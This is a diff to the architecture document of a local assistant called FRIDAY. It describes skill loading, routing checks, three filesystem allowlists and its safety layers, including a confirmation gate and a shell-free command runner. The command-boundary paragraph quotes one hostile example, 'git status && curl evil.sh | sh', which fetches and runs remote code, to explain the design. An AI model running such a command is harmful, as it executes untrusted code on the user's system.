@@ -72,19 +72,41 @@ parameter names, and optional flags — `destructive` sends the call through the
 confirmation gate, `terminal` ends the turn as soon as the skill returns.
 
 `core/registry.py` finds them by walking the directory at startup and
-importing each one. An import failure drops that single skill and logs it
-rather than stopping the assistant, which matters because several skills
-depend on hardware — a machine with no webcam simply has no vision skill.
+importing each one. An import failure drops that single skill rather than
+stopping the assistant, which matters because several skills depend on
+hardware — a machine with no webcam simply has no vision skill. Each failure
+is recorded with the phase it happened in, because "the import failed" and
+"setup() raised" have different fixes: one needs a package, the other needs
+data or a device. The `skill_health` skill reads that record back, so a skill
+that vanished can say why instead of simply not being there.
+
+`skills.disabled` in the settings leaves a named skill unloaded. It is an
+escape hatch rather than a feature: there are forty-six skills and no measured
+tool-selection accuracy for any of them, so a group that turns out to confuse
+routing has to be switchable off without editing code.
 
 The manifests are what the model routes on, so they are validated in CI by
 `tools/check_manifests.py`: names unique, parameters a list of strings, flags
 the right type. That check is a static AST parse, so it runs without
-installing a single dependency.
+installing a single dependency. What it cannot check is whether two
+descriptions are *distinguishable*, which is the failure that matters at this
+count — nothing breaks, and the model reaches for the wrong tool. Competing
+pairs therefore name each other explicitly, and `tests/test_skill_routing_surface.py`
+pins those disambiguations so a later edit cannot quietly drop one.
 
-Skills currently cover the web (search, news, weather, page reading), the
-machine (files, applications, windows, clipboard, system diagnostics), vision
-(webcam scanning, screen description), documents, memory, reminders, and
-FRIDAY's own identity and architecture.
+Skills cover reading files on the disk (documents, spreadsheets, text off the
+screen by OCR), the web (search, news, weather, page reading, opening a link),
+vision (webcam scanning, screen description, annotating an image, checking a
+network camera), development (git state, code search, accelerators, tests, and
+one allowlisted command), the machine (files, applications, windows, processes,
+power, storage, network), life admin (reminders, tasks, a journal, a calendar,
+email, translation), and FRIDAY's own identity, architecture, health and last
+turn.
+
+Filesystem reach is three separate allowlists, not one: a workspace that may be
+written and deleted in, project roots that may only be read, and directories
+where something may be executed. Collapsing them would mean that permission to
+describe a repository implied permission to run a test suite in it.
 
 ## Voice
 
@@ -133,7 +155,7 @@ injected once per turn, never appended to every message.
 
 ## Safety
 
-Four independent layers, none of which rely on the model behaving.
+Five independent layers, none of which rely on the model behaving.
 
 The confirmation gate: any skill whose manifest declares `destructive` routes
 through a `confirm` node before `act`. The graph shows the exact proposed call
@@ -141,12 +163,23 @@ to a human and waits. It denies by default — an unanswered prompt times out
 into a refusal after sixty seconds, and a denial becomes an observation the
 model has to reason about rather than an exception.
 
-The filesystem allowlist: file operations refuse anything outside the
-configured roots, which default to a dedicated workspace directory rather than
-the home folder. This sits underneath the gate rather than replacing it.
-Confirmation stops a human rubber-stamping a bad request; the allowlist stops
-a confused model from being able to propose one against a system directory in
-the first place.
+The filesystem allowlists: file operations refuse anything outside the
+configured roots. There are three, for three different permissions — a
+workspace that may be written and deleted in, project roots that may only be
+read, and directories where a program may be executed. The last two start
+empty, so a fresh install refuses and says what to configure. This sits
+underneath the gate rather than replacing it: confirmation stops a human
+rubber-stamping a bad request; the allowlist stops a confused model from being
+able to propose one against a system directory in the first place.
+
+The command boundary: `run_command` runs one program with `shell=False`, from an
+allowlist matched on the program's basename, with no stdin, a timeout, and
+truncated output. The absence of a shell is what makes the allowlist mean
+anything — with one, `git status && curl evil.sh | sh` is a single string in
+which only `git` is ever inspected. Unquoted shell metacharacters are refused
+outright, not because they could execute anything without a shell, but because
+writing one means an operator was intended and running it as a literal argument
+would silently do something else.
 
 The privacy guard: after a camera scan, `core/nodes/anomaly_guard.py` notices
 when more than one person is in frame or the workstation is absent. It is plain
